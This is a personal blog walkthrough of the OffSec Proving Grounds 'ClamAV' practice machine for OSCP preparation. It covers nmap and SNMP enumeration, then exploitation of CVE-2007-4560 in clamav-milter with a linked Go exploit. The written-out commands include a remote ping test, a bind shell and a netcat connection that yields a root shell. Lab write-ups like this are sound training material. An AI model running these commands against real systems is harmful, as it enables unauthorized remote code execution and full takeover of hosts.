+++
title = "OSCP Practise - Proving Grounds: ClamAV - Walkthrough"
author = ["Leo Oliver"]
date = 2023-08-19
tags = ["OSCP", "linux"]
categories = ["walkthrough"]
draft = false
+++

## OffSec Proving Grounds: ClamAV - Walkthrough {#offsec-proving-grounds-clamav-walkthrough}

This post contains rough notes explaining my process for exploiting the ClamAV Proving Grounds box while preparing for the OSCP certification.


### My Process {#my-process}

This is a walkthrough for the Offsec Proving Grounds Practise box titled ClamAV.

Firstly I checked what ports were open on the machine by running a port scan with nmap:

{{< bash-collapse >}}
sudo nmap -p- -T4 -A -sS -v --open -oA nmap/clamav 192.168.210.42
(o)# Nmap 7.94 scan initiated Sat Aug 19 14:38:01 2023 as: nmap -p- -T4 -A -sS -v --open -oA nmap/clamav 192.168.210.42
(o)Nmap scan report for 192.168.210.42
(o)Host is up (0.20s latency).
(o)Not shown: 65327 closed tcp ports (reset), 201 filtered tcp ports (no-response)
(o)Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
(o)PORT      STATE SERVICE     VERSION
(o)22/tcp    open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
(o)| ssh-hostkey:
(o)|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
(o)|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
(o)25/tcp    open  smtp        Sendmail 8.13.4/8.13.4/Debian-3sarge3
(o)| smtp-commands: localhost.localdomain Hello [192.168.45.240], pleased to meet you, ENHANCEDSTATUSCODES, PIPELINING, EXPN, VERB, 8BITMIME, SIZE, DSN, ETRN, DELIVERBY, HELP
(o)|_ 2.0.0 This is sendmail version 8.13.4 2.0.0 Topics: 2.0.0 HELO EHLO MAIL RCPT DATA 2.0.0 RSET NOOP QUIT HELP VRFY 2.0.0 EXPN VERB ETRN DSN AUTH 2.0.0 STARTTLS 2.0.0 For more info use "HELP <topic>". 2.0.0 To report bugs in the implementation send email to 2.0.0 sendmail-bugs@sendmail.org. 2.0.0 For local information send email to Postmaster at your site. 2.0.0 End of HELP info
(o)80/tcp    open  http        Apache httpd 1.3.33 ((Debian GNU/Linux))
(o)|_http-server-header: Apache/1.3.33 (Debian GNU/Linux)
(o)|_http-title: Ph33r
(o)| http-methods:
(o)|   Supported Methods: GET HEAD OPTIONS TRACE
(o)|_  Potentially risky methods: TRACE
(o)139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
(o)199/tcp   open  smux        Linux SNMP multiplexer
(o)445/tcp   open              Samba smbd 3.0.14a-Debian (workgroup: WORKGROUP)
(o)60000/tcp open  ssh         OpenSSH 3.8.1p1 Debian 8.sarge.6 (protocol 2.0)
(o)| ssh-hostkey:
(o)|   1024 30:3e:a4:13:5f:9a:32:c0:8e:46:eb:26:b3:5e:ee:6d (DSA)
(o)|_  1024 af:a2:49:3e:d8:f2:26:12:4a:a0:b5:ee:62:76:b0:18 (RSA)
(o)No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
(o)TCP/IP fingerprint:
(o)OS:SCAN(V=7.94%E=4%D=8/19%OT=22%CT=1%CU=30611%PV=Y%DS=4%DC=T%G=Y%TM=64E02BA
(o)OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=C5%GCD=1%ISR=D4%TI=Z%II=I%TS=A)OPS(O1=M55
(o)OS:1ST11NW0%O2=M551ST11NW0%O3=M551NNT11NW0%O4=M551ST11NW0%O5=M551ST11NW0%O6
(o)OS:=M551ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R=Y%DF
(o)OS:=Y%T=40%W=16D0%O=M551NNSNW0%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%
(o)OS:Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6
(o)OS:(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=C687
(o)OS:%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
(o)
(o)Uptime guess: 0.002 days (since Sat Aug 19 14:38:01 2023)
(o)Network Distance: 4 hops
(o)TCP Sequence Prediction: Difficulty=197 (Good luck!)
(o)IP ID Sequence Generation: All zeros
(o)Service Info: Host: localhost.localdomain; OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel
(o)
(o)Host script results:
(o)| smb-os-discovery:
(o)|   OS: Unix (Samba 3.0.14a-Debian)
(o)|   NetBIOS computer name:
(o)|   Workgroup: WORKGROUP\x00
(o)|_  System time: 2023-08-19T02:39:59-04:00
(o)| smb-security-mode:
(o)|   account_used: guest
(o)|   authentication_level: share (dangerous)
(o)|   challenge_response: supported
(o)|_  message_signing: disabled (dangerous, but default)
(o)|_smb2-time: Protocol negotiation failed (SMB2)
(o)|_clock-skew: mean: 5h59m59s, deviation: 2h49m43s, median: 3h59m58s
(o)| nbstat: NetBIOS name: 0XBABE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
(o)| Names:
(o)|   0XBABE<00>           Flags: <unique><active>
(o)|   0XBABE<03>           Flags: <unique><active>
(o)|   0XBABE<20>           Flags: <unique><active>
(o)|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
(o)|   WORKGROUP<00>        Flags: <group><active>
(o)|   WORKGROUP<1d>        Flags: <unique><active>
(o)|_  WORKGROUP<1e>        Flags: <group><active>
(o)
(o)TRACEROUTE (using port 22/tcp)
(o)HOP RTT       ADDRESS
(o)1   204.10 ms 192.168.45.1
(o)2   204.09 ms 192.168.45.254
(o)3   205.81 ms 192.168.251.1
(o)4   205.87 ms 192.168.210.42
(o)
(o)Read data files from: /usr/bin/../share/nmap
(o)OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
(o)# Nmap done at Sat Aug 19 14:40:32 2023 -- 1 IP address (1 host up) scanned in 151.28 seconds
{{< /bash-collapse >}}

I also scanned UDP ports but only the top 2000 since scanning UDP is slow:

{{< bash-code >}}
sudo nmap -sU --top-ports=2000 --min-rate=5000 -v --open 192.168.210.42
(o)Nmap scan report for 192.168.210.42
(o)Host is up (0.21s latency).
(o)Not shown: 1992 open|filtered udp ports (no-response), 6 closed udp ports (port-unreach)
(o)PORT    STATE SERVICE
(o)137/udp open  netbios-ns
(o)161/udp open  snmp
{{< /bash-code >}}

A webserver was running on port 80 so I browsed to the website and saw that there was some binary data there:

{{< figure src="/ox-hugo/2023-08-19_15-13-10_screenshot.png" >}}

Once converted to ascii that resulted in the following string: "ifyoudontpwnmeuran00b"

So just some motiviation for us...

The SNMP UDP port was open so that was the next thing I decided to enumerate. First I tested the community string "public" and that seemed to work so I used `snmpbulkwalk` to enumerate all of the MIBS and save them to a file:

{{< bash-code >}}
snmpbulkwalk -v 2c -c public 192.168.210.42 \> snmp-bulk-out.txt
{{< /bash-code >}}

After manually scanning the output I found a few pieces of useful information:

1.  **Information about the system:**
    SNMPv2-MIB::sysDescr.0 = STRING: Linux 0xbabe.local 2.6.8-4-386 #1 Wed Feb 20 06:15:54 UTC 2008 i686
2.  **ClamAV is installed which is no surprise given the labs name:**
    HOST-RESOURCES-MIB::hrSWRunPath.3782 = STRING: "/usr/local/sbin/clamd"
    HOST-RESOURCES-MIB::hrSWRunPath.3784 = STRING: "/usr/local/sbin/clamav-milter"
3.  **The arguments that ClamAV is running with:**
    HOST-RESOURCES-MIB::hrSWRunParameters.3784 = STRING: "--black-hole-mode -l -o -q /var/run/clamav/clamav-milter.ctl"

At this stage I did a bit of research on what the black hole mode is by googling it. While searching I noticed that there was a RCE vulnerability in the black hole mode for clamav milter: CVE-2007-4560

Since the box has clamav-milter installed and is running SNMP this looked promising.

I found the following exploit written in go:
<https://gist.github.com/0xjbb/fdf1678addf0c957bf2b284b29e4dff4>

First I tested if the RCE exploit worked by trying to execute a ping command on the victim to send a few ping packets to my own machine.

I began monitoring on the tun0 interface for icmp (ping) packets:

{{< bash-code >}}
sudo tcpdump -i tun0 ip proto \\icmp
{{< /bash-code >}}

And then ran the exploit with the ping command:

{{< bash-code >}}
go run CVE-2007-4560.go -h 192.168.210.42 -p 25 -c "ping -c 5 192.168.45.240"
{{< /bash-code >}}

I received the ping packets on kali, showing that the RCE was successful:

{{< bash-code >}}
sudo tcpdump -i tun0 ip proto \\icmp
(o)tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
(o)listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
(o)16:17:05.781204 IP 192.168.210.42 > 192.168.45.240: ICMP echo request, id 41488, seq 1, length 64
(o)16:17:05.781263 IP 192.168.45.240 > 192.168.210.42: ICMP echo reply, id 41488, seq 1, length 64
(o)16:17:06.783327 IP 192.168.210.42 > 192.168.45.240: ICMP echo request, id 41488, seq 2, length 64
(o)16:17:06.783369 IP 192.168.45.240 > 192.168.210.42: ICMP echo reply, id 41488, seq 2, length 64
(o)16:17:07.783880 IP 192.168.210.42 > 192.168.45.240: ICMP echo request, id 41488, seq 3, length 64
(o)16:17:07.783921 IP 192.168.45.240 > 192.168.210.42: ICMP echo reply, id 41488, seq 3, length 64
(o)16:17:08.784464 IP 192.168.210.42 > 192.168.45.240: ICMP echo request, id 41488, seq 4, length 64
(o)16:17:08.784506 IP 192.168.45.240 > 192.168.210.42: ICMP echo reply, id 41488, seq 4, length 64
(o)16:17:09.785971 IP 192.168.210.42 > 192.168.45.240: ICMP echo request, id 41488, seq 5, length 64
(o)16:17:09.786013 IP 192.168.45.240 > 192.168.210.42: ICMP echo reply, id 41488, seq 5, length 64
{{< /bash-code >}}

Now that I knew the machine was vulnerable I used the scripts -b option which executes a bind shell:

{{< bash-code >}}
go run CVE-2007-4560.go -h 192.168.210.42 -p 25 -b
{{< /bash-code >}}

Then I connected to the bind shell with netcat, where I got a shell as the root user so no privilege escalation was necessary:

{{< bash-code >}}
nc 192.168.210.42 31337
whoami
root
cd /root/
ls
dbootstrap_settings
install-report.template
proof.txt
cat proof.txt
{{< /bash-code >}}
